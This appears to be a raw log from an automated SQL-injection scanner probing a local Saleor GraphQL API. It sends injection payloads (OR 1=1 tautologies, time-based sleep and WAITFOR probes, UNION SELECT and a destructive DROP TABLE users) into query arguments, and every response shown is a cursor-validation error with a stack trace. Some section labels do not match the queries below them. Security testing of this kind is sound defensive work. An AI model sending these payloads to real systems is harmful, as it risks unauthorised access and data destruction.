[+] Introspecting http://localhost:8000/graphql/

[>] Testing warehouse (string args: ['externalReference'])

[>] Testing warehouses (string args: ['before', 'after'])

	Payload:  '

	Payload: ' AND sleep(5)--
	Query: query { menus(channel: "' AND sleep(5)--", before: "' AND sleep(5)--", after: "' AND sleep(5)--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menus"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/base64.py\", line 88, in b64decode", "    return binascii.a2b_base64(s, strict_mode=validate)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "binascii.Error: Invalid base64-encoded string: number of data characters (9) cannot be 1 more than a multiple of 4", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 94, in resolve_menus", "    return create_connection_slice(qs, info, kwargs, MenuCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menus": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' WAITFOR DELAY '0:0:5'--
	Query: query { menus(channel: "' WAITFOR DELAY '0:0:5'--", before: "' WAITFOR DELAY '0:0:5'--", after: "' WAITFOR DELAY '0:0:5'--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menus"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/base64.py\", line 88, in b64decode", "    return binascii.a2b_base64(s, strict_mode=validate)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "binascii.Error: Incorrect padding", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 94, in resolve_menus", "    return create_connection_slice(qs, info, kwargs, MenuCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menus": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR 'x'='x' /*
	Query: query { menus(channel: "' OR 'x'='x' /*", before: "' OR 'x'='x' /*", after: "' OR 'x'='x' /*") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menus"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 46, in from_global_cursor", "    return json.loads(values)", "           ^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/__init__.py\", line 346, in loads", "    return _default_decoder.decode(s)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/decoder.py\", line 341, in decode", "    raise JSONDecodeError(\"Extra data\", s, end)", "json.decoder.JSONDecodeError: Extra data: line 1 column 2 (char 1)", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 94, in resolve_menus", "    return create_connection_slice(qs, info, kwargs, MenuCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menus": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR EXISTS(SELECT * FROM users)--
	Query: query { menus(channel: "' OR EXISTS(SELECT * FROM users)--", before: "' OR EXISTS(SELECT * FROM users)--", after: "' OR EXISTS(SELECT * FROM users)--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menus"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/base64.py\", line 88, in b64decode", "    return binascii.a2b_base64(s, strict_mode=validate)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "binascii.Error: Incorrect padding", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 94, in resolve_menus", "    return create_connection_slice(qs, info, kwargs, MenuCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menus": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
	Query: query { menus(channel: "' AND 1=(SELECT COUNT(*) FROM tablename)--", before: "' AND 1=(SELECT COUNT(*) FROM tablename)--", after: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menus"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "UnicodeDecodeError: 'utf-8' codec can't decode byte 0xd0 in position 1: invalid continuation byte", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 94, in resolve_menus", "    return create_connection_slice(qs, info, kwargs, MenuCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menus": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

[>] Testing menuItem (string args: ['channel'])

[>] Testing menuItems (string args: ['channel', 'before', 'after'])

	Payload:  '
	Query: query { menuItems(channel: " '", before: " '", after: " '") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 46, in from_global_cursor", "    return json.loads(values)", "           ^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/__init__.py\", line 346, in loads", "    return _default_decoder.decode(s)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/decoder.py\", line 338, in decode", "    obj, end = self.raw_decode(s, idx=_w(s, 0).end())", "               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/decoder.py\", line 356, in raw_decode", "    raise JSONDecodeError(\"Expecting value\", s, err.value) from None", "json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR '1'='1
	Query: query { menuItems(channel: "' OR '1'='1", before: "' OR '1'='1", after: "' OR '1'='1") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 46, in from_global_cursor", "    return json.loads(values)", "           ^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/__init__.py\", line 346, in loads", "    return _default_decoder.decode(s)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/decoder.py\", line 341, in decode", "    raise JSONDecodeError(\"Extra data\", s, end)", "json.decoder.JSONDecodeError: Extra data: line 1 column 2 (char 1)", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR 1=1--
	Query: query { menuItems(channel: "' OR 1=1--", before: "' OR 1=1--", after: "' OR 1=1--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 46, in from_global_cursor", "    return json.loads(values)", "           ^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/__init__.py\", line 346, in loads", "    return _default_decoder.decode(s)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/decoder.py\", line 341, in decode", "    raise JSONDecodeError(\"Extra data\", s, end)", "json.decoder.JSONDecodeError: Extra data: line 1 column 2 (char 1)", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' OR 'a'='a
	Query: query { menuItems(channel: "' OR 'a'='a", before: "' OR 'a'='a", after: "' OR 'a'='a") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 46, in from_global_cursor", "    return json.loads(values)", "           ^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/__init__.py\", line 346, in loads", "    return _default_decoder.decode(s)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/json/decoder.py\", line 341, in decode", "    raise JSONDecodeError(\"Extra data\", s, end)", "json.decoder.JSONDecodeError: Extra data: line 1 column 2 (char 1)", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: ' UNION SELECT NULL--
	Query: query { menuItems(channel: "' UNION SELECT NULL--", before: "' UNION SELECT NULL--", after: "' UNION SELECT NULL--") { totalCount } }
	Response: {"errors": [{"message": "Received cursor is invalid.", "locations": [{"line": 1, "column": 9}], "path": ["menuItems"], "extensions": {"exception": {"code": "GraphQLError", "stacktrace": ["Traceback (most recent call last):", "  File \"/app/saleor/graphql/core/connection.py\", line 267, in connection_from_queryset_slice", "    cursor = from_global_cursor(cursor) if cursor else None", "             ^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 45, in from_global_cursor", "    values = unbase64(cursor)", "             ^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql_relay/utils.py\", line 11, in unbase64", "    return _unbase64(s).decode('utf-8')", "           ^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/base64.py\", line 88, in b64decode", "    return binascii.a2b_base64(s, strict_mode=validate)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "binascii.Error: Incorrect padding", "", "The above exception was the direct cause of the following exception:", "Traceback (most recent call last):", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executor.py\", line 452, in resolve_or_error", "    return executor.execute(resolve_fn, source, info, **args)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/usr/local/lib/python3.12/site-packages/graphql/execution/executors/sync.py\", line 16, in execute", "    return fn(*args, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/fields.py\", line 155, in new_resolver", "    return wrapped_resolver(obj, info, **kwargs)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/menu/schema.py\", line 116, in resolve_menu_items", "    return create_connection_slice(qs, info, kwargs, MenuItemCountableConnection)", "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 346, in create_connection_slice", "    slice = connection_from_queryset_slice(", "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^", "  File \"/app/saleor/graphql/core/connection.py\", line 269, in connection_from_queryset_slice", "    raise GraphQLError(\"Received cursor is invalid.\") from e", "graphql.error.base.GraphQLError: Received cursor is invalid."]}}}], "data": {"menuItems": null}, "extensions": {"cost": {"requestedQueryCost": 1, "maximumAvailable": 50000}}}

	Payload: '; DROP TABLE users; --
	Query: query { menuItems(channel: "'; DROP TABLE users; --", before: "'; DROP TABLE users; --", after: "'; DROP TABLE users; --") { totalCount } }
